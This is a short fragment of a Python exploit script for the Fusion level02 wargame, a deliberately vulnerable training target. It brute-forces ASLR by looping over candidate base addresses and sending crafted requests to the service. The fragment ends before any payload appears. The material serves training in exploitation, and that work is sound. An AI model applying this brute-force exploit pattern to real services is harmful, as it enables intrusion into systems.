#!/usr/bin/python
# -*- coding: utf-8 -*-
# exploit-exercises - fusion - level02 with ASLR bruteforce
# exploit by @vnico
...
for base in range(0xb7000000, 0xb8000000, 0x1000):
	print '[*] Trying {0:x}'.format(base)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
#	print '[*] Connecting to service'
	s.recv(57) # Read connection banner
#	print '[*] Sending initial request'
	SZ = pack('<I', 128)
	PLAINTEXT = 'A'* 128
	s.send(OP + SZ + PLAINTEXT)
	read_exactly(120, s) # Read message "encryption complete..."
